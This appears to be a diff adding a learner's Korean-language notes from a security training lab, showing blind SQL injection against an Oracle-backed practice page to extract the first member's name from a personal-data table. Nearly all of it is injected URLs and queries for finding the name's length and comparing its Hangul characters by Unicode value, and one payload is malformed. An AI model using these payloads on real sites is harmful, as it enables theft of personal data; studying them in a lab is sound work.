@@ -1,0 +1,16 @@
+추가문제
+쇼핑몰 개인정보 테이블에서 1번째 사람 이름 털기
+select NAME from MEMBER where rownum = 1
+
+https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62
+
+1. 이름 길이 구하기
+- and (select length(name) from member where rownum = 1) > 0
+https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and (select length(name) from member where rownum = 1) < 4
+-> 이름은 3글자 
+2. 이름을 아스키랑 비교
+- 이름이 한글로 되어있으면 아스키 값과 비교가 불가능
+- SELECT * FROM MEMBER WHERE ROWNUM = 1 AND TO_NUMBER(REGEXP_SUBSTR(DUMP(SUBSTR(NAME, 1, 1), 1016), '[0-9A-F]+')) = 유니코드 값;
+- https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and (SELECT * FROM MEMBER WHERE ROWNUM = 1 AND TO_NUMBER(REGEXP_SUBSTR(DUMP(SUBSTR(NAME, 1, 1), 1016), '[0-9A-F]+')) > 44032)
+
+https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and (select SUBSTR(NAME, 1, 1) FROM MEMBER WHERE ROWNUM = 1) > '가'
